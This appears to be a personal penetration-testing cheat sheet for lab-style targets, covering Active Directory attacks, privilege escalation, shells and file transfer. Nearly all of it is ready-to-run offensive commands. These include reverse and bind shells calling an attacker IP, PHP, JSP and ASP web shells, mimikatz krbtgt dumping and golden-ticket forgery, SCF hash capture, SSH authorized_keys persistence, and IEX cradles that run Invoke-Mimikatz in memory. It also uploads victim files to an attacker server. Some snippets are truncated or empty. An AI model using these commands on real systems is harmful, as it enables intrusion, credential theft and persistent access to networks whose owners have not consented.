Sometimes when obtain a administrator credential the ntlmrelay doesn't indicate that is admin(the solution is reboot the victim machine). It's very common to do this type of attack several times.

Commands:
- socks: Show proxies when some user access to some failed resource. Show the AdminStatus(true,false)

---

If you finally obtained **admin credentials** you can open /etc/proxychains.conf and check or add the proxy configuration: 127.0.0.1 1080 and socks4(no tested for socks5)

You can try to connected to the machine and you don't need to know the password thanks to the relay. 
```bash
crackmapexec smb 10.10.10.10 -u 'usuario' -p 'randomstring' -d 'dominio.local'
```

Dump the hash
```bash
crackmapexec smb 10.10.10.10 -u 'usuario' -p 'randomstring' -d 'dominio.local' --sam
```
You almost can dump the LSA(Local Security Authority)...

## AS-REP Roast/Roasting

> [!NOTE]
> **You only need a list of users**

> [!WARNING]
> Your clock must be synchronized with the clock of the DC.
> 
> To solve this you can use **rpate** or **ntpdate 10.10.10.10** to sync your computer with the DC time. With **date -s** you can put a new date.



If you have a wordlists of users but **you don't have any password** you can try to obtain a TGT(ticket granting ticket) of this users with **impacket-GetNPUsers** to obtain hash(password) that after you can try to crack it:
```bash
impacket-GetNPUsers domain.htb/ -no-pass -usersfile users.txt
```

This not work always, have to set UF_DONT_REQUIRE_PREAUTH.

If you obtain the hash you can crack with john, hashcat...

# Post-Explotation attacks

> [!NOTE]
> **You need valid credentials or access to the victim machine**

> [!NOTE]
> **Types of post-explotation attacks**
> - Kerberoasting attack
> - DCSync
> - Rubeus
> - Golden Ticket
> - 

## Kerberoasting attack

> [!WARNING]
> Your clock must be synchronized with the clock of the DC
>
> To solve this you can use **rpdate** or **ntdate 10.10.10.10** to sync your computer with the DC time. With **date -s** you can put a new date.

This techniques abuse of Kerberos and TGS(Ticket Granting Service) . The ticket have a hash with the password of the user. 

This is possible if the account user is SPN(Service Principal Name).
SPN is a unique identifier that link the account to some services running in the network(ex: IIS, SQL Server, exchange, SharePoint, LDAP...)

The service SPN have a kerberos hash with the password

You can check if is vulnerable with **impacket-GetUserSPNs**

```bash
impacket-GetUserSPNs domain.htb/user:password
```

If the output give information of users mean that are vulnerables.

You can obtain the hash:

```bash
impacket-GetUserSPNs domain.htb/user:password -request
```

To crack the hash you have to save all in a file(ex: hash.txt) and you can try to use john:
```bash
john -w:rockyou.txt hash
```

## DCSync


Obtain NTLM hashes of users:
```

```
## Rubeus
"Mimikatz of kerbereros"

You can use [Rubeus](https://github.com/GhostPack/Rubeus). You have to upload this binary to victim machine.

asreproasting attack:
```
Rubeus.exe asreproast /user:user /domain:domain.local /dc:<hostname>
```

Kerberoasting attack:
```
Rubeus.exe kerberoast /creduser:s4vicorp.local\user /credpassword:password
```


## Golden ticket attack

> [!NOTE]
> **Prerequisites**
> - Hash NTLM of krbtgt user
> - SID of the domain
> - Name of the domain
> - RID of victim user
> - Tools like mimikatz, rubeus, impacket

Allow a user to create a TGT(Ticket Granting Ticket) of Kerberos and access to all the resources of the domain without valid credentials.

To obtain the above values you can upload a mimikatz binary and obtain the information of the user **krbtgt**.
```
lsadump::lsa /inject /name:krbtgt
```

Copy all the output of the mimikatz response and save the content in a file in your attacker machine.

From here you have two ways to do it:

### Creating a golden.kirby ticket 

The idea is create golden.kirby to after upload with mimikatz in other machine and have privilage access.

Syntax to create golden ticket:
```
kerberos::golden /domain:domain.local /sid:<sid of the user krbtgt> /rc4:<has_ntlm> /user:Administrator /ticket:golden.kirbi
```

/ticket -> Name of the output file of the ticket.

One time created you have to download to your attacker machine. For transfer file you can **create a samba server**

Attacker machine:
```bash
impacket-smbserver smbFolder $(pwd) -smb2support
```

windows machine
```cmd
copy golden.kirbi \\<attacker_ip>\smbFolder\golden.kirbi
```

If you try to see the resources file of the domain controler(`dir \\DC-COMPANY\c$`) in a computer(like system32) you see that you're not allowed to list them.

In other machine you have to upload the mimikatz binary and and golden.kirbi(You can use C:\\Windows\Temp)

#### Pass The Ticket

```
kerberos::ptt golden.kirbi
```

Now if you try to do dir you can see the content available:
```
dir \\<hostname_DC>\c$
```

### Using impacket-ticketer

To obtain access to the machine
```bash
impacket-ticketer -nthash <hash_of_krbtgt> -domain-sid S-1-5... -domain domain.local Administrator
```

Generate the false ticket for Administrator user. This create Administrator.ccache file.

To obtain persistence in the domain controler you have to create an environment path that is located in the same path that Administrator.ccache.

```bash
export KRB5CCNAME="/home/sergiky/Desktop/AD/GoldenTicket/Administrator.ccache"
```

Now you don't need password to access to the domain. This is very useful because if the user change the password the golden ticket allow us toobtain a session in the domain:
```bash
psexec.py -n -k domain.local/Administrator@<DC-hostname> cmd.exe
```

---
# SCF files

If you have some user that can write in SMB you can create a scf file that allow you to obtain the hash NTLM.



Content of **file.scf**. The idea of this type of files is poisoning the icon of the file.
```
[SHELL]
Command=2
IconFile=\\<attacker_ip>\smbFolder\malicious.ico
[Taskbar]
Command=ToggleDesktop
```

With smbclient you can upload the file with `put` command

Start a Samba server:
```
impacket-smbserver smbFolder $(pẁd) -smb2support
```

If any person open the folder where is the file, only with open the folder you obtain the hash NTLM

---

# Bloodhound & neo4j

If you don't have more idea about what to do in a domain, you can use bloodhound & neo4j to obtain more information about.

BloodHound: Is a tool that analyze relationship in AD and find different ways to do a privilage escalation.
neo4j is a database of graph


If you have problems installing you have change the version of java to **11**:
```
update-alternatives --config java
```

Start the server of neo4j:
```bash
neo4j console
```

```bash
bloodhound &>/dev/null &
disown
```

You have to open a browser and put the credentials, by default the credentials is neo4j:neo4j

You need to upload a ZIP.

You can use an executable [SharpHound](https://github.com/puckiestyle/powershell/blob/master/Sharphound.exe) or a powershell script [SharpHound.ps1](https://github.com/puckiestyle/powershell/blob/master/SharpHound.ps1) inside the victim machine. You need to have a **powershell session** and upload the file.

1. You have to run the script or download with IEX(New-Object...).
2. Search the function about bloodhound and how use it

```
cat SharpHound.ps1 | grep function
cat SharpHound.ps1 | grep Invoke-BloodHound
```

3. When you found the function, you have to import the module:

```
Import-Module .\SharpHound.ps1
```

4. Then you can use this command and automatically create a zip.
```powershell
Invoke-BloodHound -CollectionMethod All
```

Now you have to download the zip

In evil-winrm session:
```
download "C:/Windows/Temp/test/20250701170038_BloodHound.zip" bloodhound.zip
```



Move the zip file to your attacker machine and upload the ZIP to bloodhound.
If you click in the left top menu > Analysis >

# Connection to the AD

## psexec

If you have a pwned in crackmapexec and winrm service is disabled you can use **impacket-psexec** to open a session. Sometime when the password have special characters used in bash you have to escaped:

```bash
impacket-psexec domain.htb/user:password@10.10.10.10 cmd.exe
```

Another way:
```bash
impacket-psexec EGOTISTICAL-BANK.LOCAL/Administrat
```

```bash
impacket-wmiexec.py domain.local/ususrio@IP -hashes <hash>
```

## winrm

Check if the user form part of Remote Management Users(Have to show pwned).

```
netexec winrm 10.10.10.175 -u 'user' -p 'password'
```

If winrm is available you try to use winrm:
```bash
evil-winrm -u 'user' -p 'password'
```

If you have dependencies problem you can use this oneliner with docker(docker have to be initi)

```
docker run --rm -ti --name evil-winrm -v /home/foo/ps1_scripts:/ps1_scripts -v /home/foo/exe_files:/exe_files -v /home/foo/data:/data oscarakaelvis/evil-winrm -i 192.168.1.100 -u Administrator -p 'MySuperSecr3tPass123!' -s '/ps1_scripts/' -e '/exe_files/'
```

Or you can use a python version of evil-winrm, you can install with:
```bash
pipx install evil-winrm-py
```


# Extra

### Login in ssh with kerberos

If you test to fail three times the password of ssh you see something like this:

`Permission denied (gssapi-keyex,gssapi-with-mic,password)`

This means that you need to use kerberos auth method to use ssh.

You need to have installed **krb5 package**, this package have a configuration file in **/etc/krb5.conf**, if you don't see, you can create with `dpkg-reconfigure krb5-config`

An example to create a valid configuration is this:
```
[libdefaults]
	default_realm = REALCORP.HTB

[realms]
# use "kdc = ..." if realm admins haven't put SRV records into DNS
	REALCORP.HTB = {
		kdc = srv01.realcorp.htb
	}

[domain_realm]
	.REALCORP.HTB = REALCORP.HTB
	REALCORP.HTB = REALCORP.HTB
```

Then you follow the next command with **sudo**:
```bash
sudo klist # Check if exist something
sudo kdestroy # to delete the ticket
sudo kinit <username> # Create a ticket with the username, you need the password
sudo klist # to check if the new ticket was created
```

Now to use ssh you have to add the option and you don't need to introduce any password:
```bash
sudo ssh -o GSSAPIAuthentication=yes j.nakazawa@10.10.10.224
```

Example of use in Tentacle machine, [s4vitar writeup](https://www.youtube.com/watch?v=hFIWuWVIDek)

# Privilage escalation

> [!NOTE]
> **If you don't found nothing you can always upload linpeas/winpeas binary**

## Windows

### Scheduled Tasks
There are two main approach to take advantages of scheduled tasks:
1. Add new scheduled task jobs
2. Trick them to execute a malicious software

Check if autologin is enable for some user, you can see the user in field DefaultUserName and password in field DefaultPassword with:

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

### Kernel exploits

### Search exposed credentials
This is very common in configuration files, log files and user history files(PSReadLine)

### Password reuse
It's possible that one password found it's used in another user, program, service...

### Vulnerable software

In Windows you can look in `C:\Program Files` to find software.

### Enumeration scripts
- Seatbelt
- JAWS
- WinPeas
- [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)


## Linux

### User privilage

#### sudo command
This command allow to execute command as a different user.

We can check what sudo privileges we have with the command:
```bash
sudo -l
```

```
User user1 may run the following commands on ExampleServer:
    (ALL : ALL) ALL
```

The above output say that we can run any command with sudo. So we can change between users.

With the following command we can change to root.
```bash
sudo su -
```

- `-` -> Indicate that use the environment of root and load variables...

This command usually required a password, but sometimes there are different program that you are allowed to execute without having to provide a password:

```bash
# sudo -l

    (user : user) NOPASSWD: /bin/echo
```

In this special occasion you can use websites such as [gtfogbolins](https://gtfobins.org/) for Linux and [lolbas](https://lolbas-project.github.io/#) for Windows.  


#### Find SUID binaries

```bash
find -perm -4000 / 2>/dev/null
```

### SSH Keys

#### read id_rsa

If we have access to read `.ssh` directory we may read the private key of other users, `/home/user/.ssh/id_rsa` or `/root/.ssh/id_rsa`. Therefore, we can create the private key and access to their account.
```bash
vim id_rsa
chmod 600 id_rsa
ssh root@10.10.10.10 -i id_rsa
```

#### Add public key in authorized_keys directory
This is useful to maintain persistence, because only the owner can add this.

To create the keys:
```bash
ssh-keygen -f key
```

We have to add the key.pub to the file:
```bash
echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys
```

Now, you can connect
```bash
ssh root@10.10.10.10 -i key
```

### Cron jobs
There are approach to have executing scripts at specific intervals to carry out a task. For example, backup every 30 minutes.

There are two main approach to take advantages of scheduled tasks:
1. Add new scheduled task jobs
2. Trick them to execute a malicious software

If we have write permission over the following directories, we can do a bash script to obtain a reverse shell.
- `/etc/crontab`
- `/etc/cron.d`
- `/var/spool/cron/crontabs/root`

### Search exposed credentials
This is very common in configuration files, log files and user history files(bash_history)

### Password reuse
It's possible that one password found it's used in another user, program, service...
### Kernel exploits

For example the kernel of linux `3.9.0-73-generic` have the `CVE-2016-5195`, otherwise known as `DirtyCow`. With this exploit we can gain root access.

### Vulnerable software

You can see the installed software with: `dpkg -l`
### Enumeration scripts
- LinEnum
- linuxprivchecker
- LinPeas


# Transferring files

## Python server and wget/curl/...
You can create a python server with:
```
python -m http.server 80
```

And use some command to download the file:
```bash
wget http://x/linenum.sh
```

```bash
curl http://x/linenum.sh -o linenum.sh
```

## scp
If we obtained ssh credentials we can use SCP to transfer files:
```bash
scp linenum.sh user@remotehost:/tmp/linenum.sh
```


## base64
In some cases, we may not be able to transfer the file because the remote host may have firewall protection. Therefore, one trick is to encode the file in base64, paste the bas64 string in the host and decode it.

```bash
base64 shell_file -w 0
```

Now in the remote host we can use:
```
echo 'base64_string' | base64 -d > shell_file
```

If you want to validate files you can use the command `file` and `md5sum` to check if have the same hash.


# Commands

## Windows

- `dir -Force`: See hidden files.

## Linux

```bash
find / -perm -4000 -type f 2>/dev/null
```

```
sudo -l
```

See capabilities

```
getcap -r / 2>/dev/null
```

Check sudo version and search exploits:

```bash
sudo --version
```

## Resources
- [gtfogbolins](https://gtfobins.org/)
- [lolbas](https://lolbas-project.github.io/#)
- LinPeas/WinPeas

# Transfer files

## Linux


## Windows

#### Creating a smb server

Server. Linux machine:
```
impacket-smbserver smbFolder $(pwd) -smb2support
```

Client. Windows machine:
```
copy \\192.168.x.x\smbFolder\file.txt
```

## Both



# Common paths

## IIS

### IIS Web

### IIS internal

- `C:\inetpub\wwwroot`


# Shells

## Bind Shell

You have to use the following command in the victim machine:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```

```python
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,
```

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```

You have to connect from your machine with netcat:
```bash
nc 10.10.10.1 1234
```

## Web Shell

```php
<?php system($_REQUEST["cmd"]); ?>
```

JSP
```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

ASP
```asp
<% eval request("cmd") %>
```

Sometimes you need to use "echo" to write the shell and the webroot directory:
```bash
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
```

One option to execute the web shell is via cURL:
```bash
curl http://SERVER_IP:PORT/shell.php?cmd=id
```

Also you can execute command using php:
```
<?php system('id'); ?>
```

You can check if work with a simple curl to the url:
```
curl http://10.129.42.190/nibbleblog/content/private/plugins/my_image/image.php
```

## Reverse Shell

```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```

If you have an old version of netcat you can use the following line:
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```

If you are trying to obtain a shell from php, remember to use system:
```php
<?php system("bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'"); ?>
```


```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```



```bash
nc -nlvp 443
```

```bash
rlwrap nc -nlvp 4646
```

- https://www.revshells.com/
- https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
- https://github.com/lukechilds/reverse-shell
- https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/

## Upgrading TTY

You can use:
```bash
script /dev/null -c bash
```

or
```python
python -c 'import pty; pty.spawn("/bin/bash")'
```

Then we hit Ctrl+Z

Use stty command with fg
```
stty raw -echo; fg
```

```bash
reset xterm
```

To clean the screen with Ctrl+L you can use:
```bash
export TERM=xterm
```

If you open some text editor like nano you see that doesn't look well, so you can obtain the dimension of one terminal in your machine with: 
```bash
stty size
```

And use in the victim shell:
```bash
stty rows 67 columns 318
```

# Paths

## Window

- host file: `C:\Windows\System32\drivers\etc\hosts`

## Linux


# File transfer methods

## Windows

### Certutil

### bitsadmin

```bash
bitsadmin /transfer miDescarga /download /priority high "https://url-del-sitio.com" "C:\Ruta\Destino\archivo.zip"
```

###  regsvr32 
Herramienta para cargar un DLL
```bash
regsvr32.exe archivo.dll
```

## Evasion techniques
- `Astaroth attack`


### Download Operation attacker -> victim

#### PowerShell Base64 Encode & Decode
We can encode all the content to transfer and decode in victim.

In addition, we should check the integrity of the file.
```bash
md5sum id_rsa
```

```bash
cat id_rsa |base64 -w 0;echo

# Obtain the base64
```


Decode in powershell:
```bash
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo="))
```


```bash
[IO.File]::WriteAllBytes("C:\Users\Public\upload_win.zip", [Convert]::FromBase64String("UEsDBAoAAAAAAFmEKVFHXocmIAAAACAAAAAOAAAAdXBsb2FkX3dpbi50eHRlNGZlZWM0NjZkNWRlNzAxMDg5YjVjYzFiZjZkNTkyYVBLAQI/AAoAAAAAAFmEKVFHXocmIAAAACAAAAAOACQAAAAAAAAAIAAAAAAAAAB1cGxvYWRfd2luLnR4dAoAIAAAAAAAAQAYAHjm8KnohtYBzETj5fqG1gEXkIab6IbWAVBLBQYAAAAAAQABAGAAAABMAAAAAAA="))
```

Obtain the hash and check with the original hash
```bash
Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```


This method is not always possible to do because cmd has a maximum string length of 8,191 characters. Also a web shell may error if you attempt to send extremely large strings.

### Powershell Web Downloads

#### PowerShell DownloadFile Method

Start the download and wait until it finish.
```powershell
(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
```

Start the download and the threat continues
```powershell
(New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
```

#### PowerShell DownloadString - Fileless Method
In place of download a powershell script to disk, we can run it directly in memory using the `Invoke-Expression`.
```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```

Also accepts pipeline input:
```powershell
(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```

#### PowerShell Invoke-WebRequest

You can use Invoke-WebRequest or their alias `iwr`, `curl`, `wget`.
```bash
Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```

#### Different ways

Harmj0y has create an extensive list of PowerShell download cradles here: https://gist.github.com/HarmJ0y/bb48307ffa663256e239


#### Commons errors with powershell
#### Internet explorer first-launch configuration has not been completed

It is possible that you obtain an error if internet explorer is not launched:
```powershell
Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX

Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.
At line:1 char:1
+ Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException
+ FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand
```

To solve this you need to add `-UseBasicParsing` parameter
```powershell
Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```

##### If the SSL/TLS certificate is not trusted

Error:

```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

Exception calling "DownloadString" with "1" argument(s): "The underlying connection was closed: Could not establish trust
relationship for the SSL/TLS secure channel."
At line:1 char:1
+ IEX(New-Object Net.WebClient).DownloadString('https://raw.githubuserc ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : WebException
```


Bypass the error with the following command:
```bash
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

#### SMB Downloads
The port 445 is common in enterprise networks to transfer files.

Create the SMB server in our attacker machine:
```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare
```

To download files in victim machine:
```bash
copy \\192.168.220.133\share\nc.exe
```

New versiones of Windows block unauthenticated guest access:
```powershell
copy \\192.168.220.133\share\nc.exe

You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.
```

To solve this, we can set a username and password using our impacket server and mount the SMB server on our windows target machine:

```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

```powershell
net use n: \\192.168.220.133\share /user:test test
```

n: is the letter of the network drive that will represent the shared folder

Copy the file:
```powershell
copy n:\nc.exe
```


#### FTP Downloads
We can configure an FTP server in our attacker machine with `pyftpdlib` module.
```bash
sudo pip3 install pyftpdlib
```

Then, we can specify port number 21, because by default, pyftpdlib uses port 2121. Anonymous authentication is enabled by default if we don't set a user and password:

```bash
sudo python3 -m pyftpdlib --port 21
```

Now, we can transfer the files using PowerShell.
```powershell
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```

Sometimes it is possible that **we don't have an interactive shell** in the remote machine. In this case, we can create a FTP command file to download a file.

First, we need to create a file containing the commands we want to execute and then use the FTP client to use that file to download that file.

```powershell
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo GET file.txt >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128
Log in with USER and PASS first.
ftp> USER anonymous

ftp> GET file.txt
ftp> bye

C:\htb>more file.txt
This is a test file
```

### Upload Operation | victim -> attacker


#### PowerShell Base64 Encode & Decode

Encode file using powershell:
```powershell
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
```

Obtain the hash:
```bash
Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
```

Copy the content and decode in our attacker machine:
```bash
echo IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo= | base64 -d > hosts
```

Check the hash:
```bash
md5sum hosts
```

#### PowerShell Web Uploads
PowerShell doesn't have a built-in function for upload operations, but we can use `Invoke-WebRequest` or `Invoke-RestMethod`.

In our attacker machine we can use https://github.com/Densaugeo/uploadserver that is an extended module of the Python http.server module, which include a file upload page.

Install it:
```bash
pip3 install uploadserver
```

Initialiazing:
```bash
python3 -m uploadserver
```

Now we can use [PSUpload.ps1](https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1) which uses `Invoke-RestMethod` to upload files. The script accept `-File` parameter and `-Uri` that is the server path (attacker server).

Install the powershell script in the victim machine:
```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
```

Execute the script:
```powershell
Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts


...
[+] File Uploaded:  C:\Windows\System32\drivers\etc\hosts
[+] FileHash:  5E7241D66FD77E9E8EA866B6278B2373
```

##### PowerShell Base64 Web Upload
Another way to use PowerShell and base64 encoded files for upload operations is by using `Invoke-WebRequest` or `Invoke-RestMethod` together with netcat.

We can send in a post request:
```powershell
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
PS C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

In our attacker machine
```bash
nc -lvnp 8000
```

We can copy the output string and create the file with the content.
```bash
echo <base64> | base64 -d -w 0 > hosts
```

#### SMB Upload
Commonly enterprise don't allow the SMB protocol out of their internal network to avoid potential attacks.

An alternative is run SMB over HTTP with `WebDav`. This protocol enables a webserver to behave like a fileserver, supporint collaborative content authoring. WebDav can also use HTTPS.

It will try to connect using SMB, but if there's no SMB share available, it will try to connect with HTTP.

To configure a webdav server in our attacker machine we need to do the following steps. To obtain more information you can visit [wsgidav github](https://github.com/mar10/wsgidav)

Install the python modules:
```bash
sudo pip3 install wsgidav cheroot
```

Using the webdav python module:
```bash
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 
```

Connecting from the victim machine:
```bash
dir \\192.168.49.128\DavWWWRoot
```

> [!NOTE]
> **DavWWWRoot special keyword**
